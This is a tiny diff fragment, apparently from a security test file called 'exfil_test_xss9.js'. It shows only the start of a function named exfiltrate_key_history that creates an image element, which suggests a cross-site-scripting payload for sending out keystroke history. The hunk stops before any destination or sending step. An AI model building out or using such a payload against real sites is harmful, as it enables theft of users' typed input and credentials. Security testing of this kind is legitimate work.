@@ -1,3 +1,4 @@
+// exfil_test_xss9.js
 function exfiltrate_key_history() {
   var script = document.createElement("img");
   var v0 = script;
